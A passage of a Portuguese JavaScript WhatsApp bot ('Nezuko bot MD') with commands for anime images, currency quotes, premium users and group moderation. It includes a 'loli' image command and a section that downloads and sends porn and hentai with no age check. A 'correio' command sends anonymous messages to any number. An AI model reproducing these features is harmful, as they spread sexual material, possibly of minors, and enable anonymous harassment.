var but = [{buttonId: `${prefix}waifu`, buttonText: { displayText: "<❗> PRÓXIMO <❗> " }, type: 1 }]
nezuko.sendMessage(from, { caption: "AQUI ESTÁ!!!", image: { url: pickRandom(data.result) }, buttons: but, footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO' }, { quoted: dnselo})
 break

case 'husbu':
reply(mess.wait)
var query = ["husbu anime","husbu hd","husbu aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${prefix}husbu`, buttonText: { displayText: "<❗> PRÓXIMO <❗> " }, type: 1 }]
nezuko.sendMessage(from, { caption: "AQUI ESTÁ!!!", image: { url: pickRandom(data.result) }, buttons: but, footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO' }, { quoted: dnselo})
 break

case 'loli':
reply(enviar.espere)
{
buffer = `https://nezsab-apis.xyz/api/loli`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '<❗> PRÓXIMO <❗>'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: '👁️',buttons: buttons01,headerType: 4}
nezuko.sendMessage(from, buttonMessage01, {quoted:m})}
break

case 'cosplay':
reply(enviar.espere)
{
buffer = `https://api.zacros.my.id/randomimg/cosplay`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '<❗> PRÓXIMO <❗>'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
nezuko.sendMessage(from, buttonMessage01, {quoted:m})}
break

case 'juice':{
let link = `https://textpro.me/fruit-juice-text-effect-861.html`
let anui = await textpro(link, q)
     fakey(`Espere um minuto está fazendo o criador cerca de 1 minuto a menos`) 
     console.log(anui)
    nezuko.sendMessage(from, {image:{url:anui}, caption:"PRONTO!"}, {quoted:m})
}
   break

case 'avalie':
                const avalie = body.slice(8)
                if (args.length <= 1) return reply(`Exemplo: ${prefix}avaliar Bot muito bom, parabéns.`)
                if (args.length >= 400) return reply('Máximo 400 caracteres')

                tdptls = `[<❗> Avaliação ]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\n: ${avalie}`

                await nezuko.sendMessage(`${numerodonoa}@s.whatsapp.net`, { text: `${tdptls}`, "contextInfo": { mentionedJid: [sender] } }, { quoted: dnselo})
                reply("mensagem enviada ao meu dono, obrigado pela avaliação, iremos melhorar a cada dia.")
                break

case 'neko2':
reply(enviar.espere)			
   waifud = await axios.get('https://waifu.pics/api/sfw/neko')
var wbutsss = [
{buttonId: `${prefix}neko2`, buttonText: {displayText: `<❗> PRÓXIMO <❗>`}, type: 1},
]
      let buttonssMessage = {
       image: {url:waifud.data.url},
       caption:  `Aqui está...`,
      footer: `𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`,
      buttons: wbutsss,
      headerType: 4
      }
await nezuko.sendMessage(from,buttonssMessage, { quoted:m }).catch(err => {
    return('Error!')
}) 
break

case 'zoro': case 'luffy': case 'sanji': case 'ussop': case 'nami': case 'copper': case 'naruto': 
case 'minato': case 'sasuke': case 'sakura': case 'boruto': case 'sarada': case 'mitsuki':
case 'orochimaru': case 'tsunade': case 'kakashi': case 'killua': case 'gon': case 'rimuru': 
case 'sagiri': case 'natsu': case 'tanjirou': case 'nezuko': case 'senku': 
nezuko.sendMessage(from, { react: { text: `👋`, key: m.key }})  
const judul = command
hx.pinterest(judul)
.then(result => {
angka = ['1','2','3','4','5','6','7','8','9']
const randomnay1 = angka[Math.floor(Math.random() * (angka.length))]	
const buttons = [{buttonId: `${prefix + command}`, buttonText: {displayText: '<❗> PRÓXIMO <❗>'}, type: 1}]
const buttonMessage = {image: {url: result[randomnay1]},caption: "AQUI ESTÁ!!", footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO',buttons: buttons,headerType: 4}
nezuko.sendMessage(from, buttonMessage, {quoted: dnselo})})
break 


//========FINAL DAS LOGOS============

//==============COTAÇÃO================\\
case 'cotacao':
case 'cotação': {
if(!isPremium) return reply(mess.premium)
//CASE CRIADA POR @CARLOS
const listMessage = {
text: ` Óla ${pushname}!! como posso te ajudar?`,
footer: "entre em meu grupo para novidades!",
buttonText: "Clique Aqui!!",
sections: [{
title: `Selecione a moeda que voce deseja saber o valor.`,
rows: [
{
  title: "EURO 💶",
  description: "\n\n_Valor do Euro_",
  rowId: `${prefix}euro`,
},
{
  title: "DÓLAR 💵",
  description: "\n\n_Valor do Dólar_",
  rowId: `${prefix}dolar`,
},
{
  title: "LIBRA 💷",
  description: "\n\n_Valor da Libra_",
  rowId: `${prefix}libra`,
},
{
  title: "BITCOIN 🪙",
  description: "\n\n_Valor do Bitcoin_",
  rowId: `${prefix}bitcoin`,
},
{
  title: "ETHEREUM ⬨",
  description: "\n\n_Valor do Ethereum_",
  rowId: `${prefix}ethereum`,
},
                ],
              },
            ],
            listType: 1,
          };

          nezuko.sendMessage(m.chat, listMessage, {
            quoted: m,
          });
        }
        break;

case 'dolar':
case 'euro':
case 'libra': {
if(!isPremium) return reply(mess.premium)
//CASE CRIADA POR @CARLOS
          if (command == "dolar") {
            var money = "USD-BRL";
          } else if (command == "euro") {
            var money = "EUR-BRL";
          } else if (command == "bitcoin") {
            var money = "BTC-BRL";
          } else if (command == "libra") {
            var money = "GBP-BRL";
          } else if (command == "ethereum") {
            var money = "ETH-BRL";
          }
          axios
            .get(`https://economia.awesomeapi.com.br/last/${money}`)
            .then((response) => {
              if (command == "dolar") {
                var resposta = response.data.USDBRL;
              } else if (command == "euro") {
                var resposta = response.data.EURBRL;
              } else if (command == "libra") {
                var resposta = response.data.GBPBRL;
              }
              reply(`*Cotação nas ultimas 24H* 💱 \nMoeda: ` +
resposta.name +
"\nValor mais alto: " +
Number(resposta.high).toFixed(2) +
"\nValor mais baixo: " +
Number(resposta.low).toFixed(2) +
"\nValor atual: " +
Number(resposta.bid).toFixed(2)
              );
            })
            .catch((response) => {
              console.log("erro");
            });
        }
        break;

      case 'bitcoin':
      case 'ethereum': {
if(!isPremium) return reply(mess.premium)
//CASE CRIADA POR @CARLOS
          if (command == "bitcoin") {
            var money = "BTC-BRL";
          } else {
            var money = "ETH-BRL";
          }
          axios
            .get(`https://economia.awesomeapi.com.br/last/${money}`)
            .then((response) => {
              if (command == "bitcoin") {
                var resposta = response.data.BTCBRL;
              } else {
                var resposta = response.data.ETHBRL;
              }
              reply(` *Cotação nas ultimas 24H* 💱\nMoeda: ` +
resposta.name +
"\nValor mais alto: " +
resposta.high +
"\nValor mais baixo: " +
resposta.low +
"\nValor atual: " +
resposta.bid
              );
            })
            .catch((response) => {
              console.log("erro");
            });
        }
        break;
        
        case 'dolarhoje':
if(!isPremium) return reply(mess.premium)
                try {
                    dolar = await fetchJson('https://cdn.jsdelivr.net/gh/fawazahmed0/currency-api@1/latest/currencies/usd/brl.json')
                    reply(dolar.brl + ' R$')
                } catch {
                    reply('Erro ao obter informação')
                }
                break

            case 'eurohoje':
            if(!isPremium) return reply(mess.premium)
                try {
                    dolar = await fetchJson('https://cdn.jsdelivr.net/gh/fawazahmed0/currency-api@1/latest/currencies/eur/brl.json')
                    reply(dolar.brl + ' R$')
                } catch {
                    reply('Erro ao obter informação')
                }
                break

            case 'bitcoinhoje':
if(!isPremium) return reply(mess.premium)
                try {
                    dolar = await fetchJson('https://cdn.jsdelivr.net/gh/fawazahmed0/currency-api@1/latest/currencies/btc/brl.json')
                    reply(dolar.brl + ' R$')
                } catch {
                    reply('Erro ao obter informação')
                }
                break

            case 'ethereumhoje':
if(!isPremium) return reply(mess.premium)
                try {
                    dolar = await fetchJson('https://cdn.jsdelivr.net/gh/fawazahmed0/currency-api@1/latest/currencies/eth/brl.json')
                    reply(dolar.brl + ' R$')
                } catch {
                    reply('Erro ao obter informação')
                }
                break
       
//=====================================\\      

//========(FUNÇÕES-PORNO-AQUI)=======\\


case 'xvd':			
case 'xvds':
case 'xvideo':
if(!isPremium) return reply(mess.premium)
try {
if (args.length < 1) return reply(`Você precisa colocar um link!\n Use: *_xvdss mia khalifa* (por exemplo) e use o link.`)
if (!isUrl(args[0]) && !args[0].includes('https://xvideos.com/')) return reply(`O link está errado, verifique e tente novamente`)
nezuko.sendMessage(from, { react: { text: `👋`, key: m.key }})      
res = await fetchJson(`https://mnazria.herokuapp.com/api/porndownloadxvideos?url=${args[0]}`, {method: 'get'})
buffer = await getBuffer(res.mp4)
nezuko.sendMessage(from, {audio: buffer, mimetype: 'audio/mp4'}, {quoted: dnselo})
nezuko.sendMessage(from, {video: buffer, mimetype: 'video/mp4'}, {quoted: dnselo})
} catch (e) {
console.log(`Erro:`, color(e,'red'))
console.log(`${e}`)
}
break

case 'xvideos': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
nezuko.sendMessage(from, { react: { text: `🔞`, key: m.key }})    
if(!q.length > 2) return reply("Cade o título do porno que deseja pesquisar?")
var Lrows = []
datab = await fetchJson(`https://nezsab-apis.xyz/api/xvideos?q=${q}&apikey=${keyapi}`)
for(let a of datab.resultado) {
Lrows.push({title: a.nome, description: `Duração: ${a.tempo} > Qualidade do Vídeo: ${a.qualidade}\nLink: ${a.link}`, rowId: `${prefix}xvideos-dw ${a.link}`})
}
listMessagse = {
text: `Aqui está o resultado da sua\npesquisa: ${q}\nSelecione para baixar o vídeo.`,
footer: `By: ${NomeDoBot}`,
title: `⸺͟͞ꪶ𝐏𝐄𝐒𝐐𝐔𝐈𝐒𝐀: 𝐗𝐕𝐈𝐃𝐄𝐎𝐒ꫂ ✰✰✰`,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${NomeDoBot}`, 
rows: Lrows
}
]
}
nezuko.sendMessage(from, listMessagse)
}
break

case 'xvideos-dw': // @Vitinho 
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
nezuko.sendMessage(from, {react: {text: `✅`, key: info.key}})
anu = await fetchJson(`https://www.nezsab-apis.xyz/download/xvideos?url=${q}&apikey=${keyapi}`)
reply('*⬇️ Baixando, aguarde um instante...*')
nezuko.sendMessage(from, { video: { url: anu.resultado.link }, mimetype: 'video/mp4', fileName: `${NomeDoBot}.mp4`, caption: `Aqui está o vídeo seu humano punheteiro, boa punheta pra você! <3` }, { quoted: dnselo })
break

case 'pornovid':{
if(!isPremium) return reply(enviar.msg.premium)
reply(`Já estou enviando no pv ${pushname}`)
await nezuko.sendMessage(from, {react: { text: "😈", key: info.key }})
  bla = JSON.parse(fs.readFileSync("./armor/sexv.json")) 
button = [
  {buttonId: `${prefix}pornovid`, buttonText: {displayText: '😈[suivant]😈'}, type: 1}
]
buttonMessage = {
 video: {url: bla[Math.floor(Math.random() * bla.length)],
 quoted: info},
 caption: '(⁠ ⁠˘⁠ ⁠³⁠˘⁠)⁠♥',
 footer: `@${pushname}`,
 button: button,
 headerType: 1
}
nezuko.sendMessage(sender, buttonMessage)
}
break

case 'forestfaye':
if(!isPremium) return reply(enviar.msg.premium)
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/forestfaye.jpeg`)
txt = `*Pack da ForestFayee* _(Google Fotos)_\n\nhttps://bit.ly/2ZmIwGi`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break

case 'hentai-neko' :
case 'hneko' :
reply(`<❗> Enviando no seu pv, aguarde.`)
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
reply(enviar.espere)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let hnekobot = [
    {buttonId: `${prefix}${command}`, buttonText: {displayText: `<❗> PRÓXIMO <❗>`}, type: 1},
    ]
  let button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `AKI ESTÁ PUNHETEIRO...`,
  buttons: hnekobot,
  headerType: 1
  }      
await nezuko.sendMessage(sender, button3Messages, { quoted:m }).catch(err => {
    return('Error!')
})
break

case 'mia': {
 
 nezuko.sendMessage(from, { react: { text: `👋`, key: m.key }})      
		let { pinterest } = require('./funções de cmd/funções/scraper')
const pesquisass = ["mia khalifa","mia khalifa hd","khalifa", "mia khalifa 2022", "porno xvideo"]
let searchqs = pesquisass[Math.floor(Math.random() * pesquisass.length)]


 let getpin2 = await pinterest("mia khalifa")
 let resultpin2 = getpin2[Math.floor(Math.random() * getpin2.length)]
const figg = await getBuffer(resultpin2)
buffer = await imageToWebp(figg)
let encmedia8 = await nezuko.sendVideoAsSticker(from, resultpin2, m, { packname: `NEZUKO BOT`, author: `MIA KHALIFA` })
await fs.unlinkSync(encmedia8)
}

break

case 'hentai': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
reply(enviar.espere)
anu = await hentai()
result = anu[Math.floor(Math.random() * anu.length)]
     nezuko.sendMessage(from, { video: { url: result.video_1 }, caption: `⭔ Título : ${result.title}\n⭔ Views : ${result.views_count}\n⭔ compartilhamentos : ${result.share_count}` }, { quoted: dnselo})
}
break
//========(FINAL DE FUNÇÕES-PORNO-AQUI)=======\\

case 'serpremium':
case 'serprem':  
if (!SoDono && !m.key.fromMe) return reply(mess.donosmt)
premium.push(`${numerodonoa}@s.whatsapp.net`)
fs.writeFileSync('./funções de cmd/usuarios/premium.json', JSON.stringify(premium))
reply(`Pronto ${numerodonoa} você foi adicionado na lista premium.`)
break

case 'addpremium':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return 
if (!budy.includes("@55")) {
mentioned = info.message.extendedTextMessage.contextInfo.participant 
bla = premium.includes(mentioned)
if(bla) return reply("*Este número já está incluso..*")  
premium.push(`${mentioned}`)
fs.writeFileSync('./funções de cmd/usuarios/premium.json', JSON.stringify(premium))
nezuko.sendMessage(from, {text: `👑@${mentioned.split("@")[0]} foi adicionado à lista de usuários premium com sucesso👑`}, {quoted: info})  
} else { 
mentioned = args.join(" ").replace("@", "") + "@s.whatsapp.net"
bla = premium.includes(mentioned)
if(bla) return reply("*Este número já está incluso..*")  
premium.push(`${mentioned}`)
fs.writeFileSync('./funções de cmd/usuarios/premium.json', JSON.stringify(premium))
tedtp = args.join(" ").replace("@", "")
nezuko.sendMessage(from, {text: `👑@${tedtp} foi adicionado à lista de usuários premium com sucesso👑`, mentions: [mentioned]}, {quoted: info})
}
break 

case 'delpremium':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !info.key.fromMe) return  reply(enviar.msg.donosmt)
if (!budy.includes("@55")) {
num = info.message.extendedTextMessage.contextInfo.participant
bla = premium.includes(num)
if(!bla) return reply("*Este número não está incluso na lista premium..*")  
pesquisar = num
processo = premium.indexOf(pesquisar)
while(processo >= 0){
premium.splice(processo, 1)
processo = premium.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/usuarios/premium.json', JSON.stringify(premium))
nezuko.sendMessage(from, {text: ` ${num.split("@")[0]} foi tirado da lista premium com sucesso..`}, {quoted: info})
} else {
mentioned = args.join(" ").replace("@", "") + "@s.whatsapp.net"
bla = premium.includes(mentioned)
if(!bla) return reply("*Este número não está incluso na lista premium..*")  
pesquisar = mentioned
processo = premium.indexOf(pesquisar)
while(processo >= 0){
premium.splice(processo, 1)
processo = premium.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/usuarios/premium.json', JSON.stringify(premium))
nezuko.sendMessage(from, {text: ` @${mentioned.split("@")[0]} foi tirado da lista premium com sucesso..`}, {quoted: info})
}
break

case 'premiumlist':
if(!isPremium) return reply(enviar.msg.premium)   
tkks = '╭────「 𝐔𝐒𝐔𝐀́𝐑𝐈𝐎𝐒 𝐏𝐑𝐄𝐌𝐈𝐔𝐌𝐒 」\n'
for (let V of premium) {
tkks += `│+  @${V.split('@')[0]}\n`
}
tkks += `│+ Total : ${premium.length}\n╰──────「 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿 」────`
reply(tkks.trim())
break

case 'checarprem':
    if(!isPremium) {
      reply(`Não, você não tem Premium.`)
    } else {
        reply(`Sim, você tem premium!`)
    }
    break

case 'getquoted':
case 'getinfo':  
case 'get':  
if(!isPremium) return reply(enviar.msg.premium)   
reply(JSON.stringify(info.message.extendedTextMessage.contextInfo, null, 3))
break

case 'id':
case 'figuid':
if (!SoDono && !info.key.fromMe) return 
if (isQuotedSticker) {
var figu = info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString("base64");
reply(figu)
}
break

case 'autoban':
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if(isAdeusCara) return reply("Já está ativado.")
var ind = dbids.indexOf(from)
if(isAdeusCara) {
adeuscara[ind].actived = true
} else {
adeuscara.push({
groupId: from,
actived: true,
number: []
})
}
fs.writeFileSync('./funções de cmd/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`Ativou com sucesso o recurso de autoban neste grupo✔️`)
} else if (Number(args[0]) === 0) {
if(!isAdeusCara) return reply("Já está Desativado.")  
var ind = dbids.indexOf(from)		
if(isAdeusCara) {
adeuscara[ind].actived = false
} else {
adeuscara.push({
groupId: from,
actived: false,
number: []
})
}
fs.writeFileSync('./funções de cmd/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`Desativou com sucesso o recurso de autoban neste grupo✔️`)
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'listban':
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins) return reply(enviar.msg.adm)
var ind = dbids.indexOf(from)
if(!isAdeusCara) return reply('*Nenhum Número não foi adicionado*')
teks = '*Números que vou moer na porrada se voltar 😡:*\n'
for(i=0;i<adeuscara[ind].number.length;++i) {
teks += `➤ *${adeuscara[ind].number[i]}*\n`
}
teks += '*Esses ai vou descer meu martelo do ban 🥵*'
reply(teks)
break  

case'reagir': {

if (!SoDono) return reply(`<❗> Somente meu dono pode usar esse comando.`)

reactionMessage = {react: {text: args[0], key: { remoteJid: m.chat, fromMe: true, id: quoted.id }

                    }

                }

                nezuko.sendMessage(m.chat, reactionMessage)}

            break

case'opentime':

case 'abrirtime':

addFilter(from)  

if (!m.isGroup) return reply(mess.only.group)

if (!isBotAdmins) return reply(mess.only.botadm)

if (!batdmins) return m.reply(mess.only.gcadmin)

if (args[1]=="segundos") {var timer = args[0]+"000"

} else if (args[1]=="minutos") {var timer = args[0]+"0000"

} else if (args[1]=="horas") {var timer = args[0]+"00000"

} else {return m.reply("*Selecionar :*\nsegundos\nminuto\nhora\n\n*Exemplo*\n10 segundos")}

setTimeout( () => {

nezuko.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply('Grupo aberto com sucesso'))

}, timer)

break

case'closetime':

addFilter(from)  

if (!m.isGroup) return reply(mess.only.group)

if (!isBotAdmins) return reply(mess.only.botadm)

if (!batdmins) return m.reply(mess.only.gcadmin)

if (args[1]=="segundos") {var timer = args[0]+"000"

} else if (args[1]=="minutos") {var timer = args[0]+"0000"

} else if (args[1]=="horas") {var timer = args[0]+"00000"

} else {return reply("*Selecionar:*\nsegundos\nminutos\nhora\n\n*Exemplo*\n10 segundos")}

setTimeout( () => {

nezuko.groupSettingUpdate(m.chat, 'announcement').then((res) => reply('Grupo fechado com sucesso'))

}, timer)

break

case 'listagp':
try {
if (!SoDono) return reply(enviar.msg.donosmt)
let getGroups = await nezuko.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
if(q.includes("-l") || q.includes("--list")) {
array_gps = [];
for(let a of groups) {
try {
array_gps.push({
title: `‍𝗡𝗼𝗺𝗲: ${a.subject}`,
description: `𝗜𝗱: ${a.id}\n𝗠𝗲𝗺𝗯𝗿𝗼𝘀: ${a.participants.length}`,
rowId: `${prefix + command} ${a.id}`
})
} catch {}
}
buttonmessage02 = {
title: `Lista de grupos`,
text: `Selecione um grupo para mais detalhes`,
buttonText: "Selecionar",
sections: [
            {
                rows: array_gps
            }
           ]
}
nezuko.sendMessage(from, buttonmessage02, {quoted: info})
} else if (q && args[0].endsWith("g.us")) {
try {
let infogp = await nezuko.groupMetadata(`${args[0]}`)
try {
ppUrl = await nezuko.profilePictureUrl(`${args[0]}`, 'image')
} catch { ppUrl = "https://telegra.ph/file/41634a68c48c40189dbf7.jpg" }
try {
linkgc = await nezuko.groupInviteCode(infogp.id)
linkgp = 'https://chat.whatsapp.com/'+linkgc
} catch { linkgp = "Bot não é admin" }
txt = 
`𝗡𝗼𝗺𝗲 𝗱𝗼 𝗴𝗿𝘂𝗽𝗼: ${infogp.subject}
𝗗𝗼𝗻𝗼: ${infogp.owner ? infogp.owner : "Não tem"}
𝗠𝗲𝗺𝗯𝗿𝗼𝘀: ${infogp.participants.length}
𝗜𝗱: ${infogp.id}
𝗟𝗶𝗻𝗸: ${linkgp}
`
await nezuko.sendMessage(from, {image: {url: ppUrl}, caption: txt, thumbnail: null, mentions: [sender]}, {quoted: info})
} catch {}
} else {
txt = "━━━━━━━━━━━━━━━━━━\n"
array_owners = [];
for(let a of groups) {
txt += `𝗡𝗼𝗺𝗲 𝗱𝗼 𝗴𝗿𝘂𝗽𝗼: ${a.subject}
𝗗𝗼𝗻𝗼 / 𝗰𝗿𝗶𝗮𝗱𝗼𝗿: @${a.owner ? a.owner.split("@")[0] : "Não tem"}
𝗠𝗲𝗺𝗯𝗿𝗼𝘀: ${a.participants.length}
𝗜𝗱: ${a.id}\n━━━━━━━━━━━━━━━━━━\n
`
if(a.owner !== undefined) {
array_owners.push(`${a.owner}`)
}
}
nezuko.sendMessage(from, {text: txt, mentions: array_owners})
}
} catch {
reply("Hmm deu erro")
}
break

//==========SUBSTITUIÇÕES============\\
case 'index-bot':
if(!SoDono)return reply('Somente meu criador.')
if (isMedia && !info.message.videoMessage || isQuotedDocument) {
media = isQuotedDocument ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : info.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync('./nezuko.js', doc)
nezuko.sendMessage(from, {text:'Pronto mestre.'},{quoted: dnselo})
} else {
reply('Error.')
}
break

case 'index-bot2':
if(!SoDono)return reply('Apenas meu mestre')
if (isMedia && !info.message.videoMessage || isQuotedDocument) {
media = isQuotedDocument ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : info.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync('./index.js', doc)
nezuko.sendMessage(from, {text:'Pronto Mestre.'},{quoted: info})
} else {
reply('nao deu')
}
break

case 'enviarindex': case 'enviar-index':
if (!SoDono  && !info.key.fromMe) return reply(enviar.msg.donosmt)  
bla = fs.readFileSync(`./index.js`)
nezuko.sendMessage(sender, {document: bla, mimetype: 'document/js', fileName: `index.js`})
break

case 'enviarindex2': case 'enviar-index2':
if (!SoDono  && !info.key.fromMe) return reply(enviar.msg.donosmt)  
bla = fs.readFileSync(`./sabrina.js`)
nezuko.sendMessage(sender, {document: bla, mimetype: 'document/js', fileName: `nezuko.js`})
break

case 'substituir':
if(!SoDono && !isnit) return reply("Apenas meu mestre.")
 if (isMedia && !info.message.videoMessage || isQuotedDocument) {
media = isQuotedDocument ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : info.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync(q, doc)
nezuko.sendMessage(from, {text:'Substituido com sucesso..'},{quoted: info})
} else {
reply('nao deu')
}
break

//==========FIM============\\

case 'addautorm':
case 'addautoban':
case 'listanegra':  
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if (args.length < 1) return reply('Cade o número?')
var ind = dbids.indexOf(from)
if(isAdeusCara) {
listng = q.replace(new RegExp("[()+-/ +/]", "gi"), "")  
var numind = adeuscara[ind].number.indexOf(listng)
if(numind >= 0) return reply('*Esse Número ja esta incluso*')
adeuscara[ind].number.push(listng)
} else {
listng = q.replace(new RegExp("[()+-/ +/]", "gi"), "")    
adeuscara.push({
groupId: from,
actived: false,
number: [listng]
})
}
fs.writeFileSync('./funções de cmd/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`*Número adicionado a lista de autoban*`)
break

case 'delremover':
case 'delautorm':  
case 'delautoban': 
case 'tirardalista':  
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if (args.length < 1) return reply('Diga o numero sem espaço, + ou traço')
if (isNaN(args[0])) return reply('Diga o numero sem espaço, + ou traço')
var ind = dbids.indexOf(from)
if(!isAdeusCara) return reply('*Nenhum Número não foi adicionado*')
var numind = adeuscara[ind].number.indexOf(args[0])
if(numind < 0) return reply('*Esse número não está incluso*')
adeuscara[ind].number.splice(numind, 1)
fs.writeFileSync('./funções de cmd/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`*Número removido a lista de autoban*`)
break

case 'banghost':
case 'banghosts':  
if(!isGroup) return reply(enviar.msg.grupo)  
if(!SoDono) return reply("Só dono pode executar este comando..")
if (!isBotGroupAdmins) return reply('Bot precisa ser ADM, para executar esta função.')
if(q.length < 1) return reply(`Exemplo: ${prefix}banghosts 0\n\nEle vai banir todos aqueles que tá com 0 mensagens, mas faça isso apenas se passou um tempo com o bot armazenando mensagem dos membros ativos do grupo.`)
async function banghst() {
if(groupIdscount.indexOf(from) >= 0) {
for(let obj of groupMembers) {
if(numbersIds.indexOf(obj.id) >=0) { 
var indnum = numbersIds.indexOf(obj.id)
if(countMessage[ind].numbers[indnum].messages <= args[0]) {
if(groupAdmins.includes(obj.id)) return mentions(`@${obj.id} ta liberado da inspeção por ser admin`, [obj.id], true)
if(numerodono.includes(obj.id)) return mentions(`@${obj.id} ta liberado da inspeção por ser dono`, [obj.id], true)
nezuko.groupParticipantsUpdate(from, [obj.id], 'remove')
}
}
}
}
}
setInterval(banghst, 1000)
break

case 'convite':
if(!budy.includes("chat.whatsapp.com")) return reply("Cadê o link do grupo que você deseja que eu entre?")
cnvt = args.join(" ")
reply(`O convite para o bot entrar em seu grupo, foi enviado, espere o dono aceitar..`)
sendBtext(`${numerodonoa}@s.whatsapp.net`,`☔ Convite para entrar em um Grupo\n\nLink : ${cnvt}\n\nNúmero dele(a) : wa.me/${sender.split("@")[0]}`, `𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿️`, [
{buttonId: `${prefix}entrar ${cnvt}`, buttonText: {displayText: `Aceitar`}, type: 1},
{buttonId: `${prefix}recusar ${sender}`, buttonText: {displayText: `Recusar`}, type: 1}], selo)
break

case 'recusar':
if(!SoDono) return reply("Só dono...")
nezuko.sendMessage(q, {text: `Olá Amigo(a), sinto muito dizer, mas seu convite foi recusado 🥺`})
break

case 'join':
case 'entrar':
if (!SoDono) return reply(enviar.msg.donosmt)
if (!q) return reply('Coloque o link')
if (!isUrl(args[0]) || !args[0].includes('whatsapp.com')) return reply("Link inválido")
try {
let result = args[0].split('chat.whatsapp.com/')[1]
await nezuko.groupAcceptInvite(result)
reply('Prontinho, fiz o que você pediu')
} catch(erro) {
if(String(erro).includes("resource-limit")) {
reply("O bot não pode entrar nesse grupo porque ele está lotado")
} else if(String(erro).includes("not-authorized")) {
reply("O bot não pode entrar nesse grupo porque ele foi removido")
} else if(String(erro).includes("gone")){
reply("O bot não pode entrar nesse grupo porque o link foi redefinido")
} else if(String(erro).includes("not-acceptable")) {
reply("Esse grupo não existe")
} else {
reply("Hmm não consegui entrar no grupo")
}
}
break

case 'correio':
{
txt = args.join(" ")
if(!txt) return reply(`Exemplo: ${prefix + command} +55 00.../Oi amor, sdds`)
let txt1 = txt.split("/")[0].replace(/\D/g,'');
let txt2 = txt.split("/")[1];
if(!txt1) return reply('Cadê o número da pessoa?')
if(!txt2) return reply('Cadê a mensagem do correio?')
let [result] = await nezuko.onWhatsApp(txt1)
if(!result) return reply(`Número inválido`)
bla = 
`╭┄━┄━┄━┄━┄━╮
┞┧ ⸙. ͎۪۫          💌  ː͡₊ꞋꞌꞋꞌ
┞┧Correio anônimo
┞┧Msg: ${txt2}
┞┧
╰┄━┄━┄━┄━┄━╮`
nezuko.sendMessage(result.jid, {text: bla})
reply(`Mensagem enviada com sucesso para wa.me/${result.jid.split("@")[0]}`)
}
break
//==============LEGENDAS=============

case 'legendabv':
                if (!isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (q.length < 5) return reply('Coloca um bem vindo maior!')
                    if (isGroup && groupoid.indexOf(from) >= 0) {
                        var indoo = groupoid.indexOf(from)
                        bemvindojson[indoo].mensagembv = q ? q : 'Bem Vindo!'
                                await fs.writeFileSync('./funções de cmd/grupos/bvmsg.json', JSON.stringify(bemvindojson, null, 2) + '\n')
                                reply(`Trocou a mensagem de bem vindo para: ${bemvindojson[indoo].mensagembv}`)
                        } else {
                            reply('Não Consegui colocar a descricão!')
                
                        }
                break

case 'legenda2': {
    if (!/image/.test(mime)) return reply( `Enviar/responder imagem/adesivo com legenda ${prefix + command} texto1|text2`)
if (!text) return reply( `Enviar/responder imagem/adesivo com legenda ${prefix + command} texto1|text2`)
    nezuko.sendMessage(from, { react: { text: `👋`, key: m.key }})      
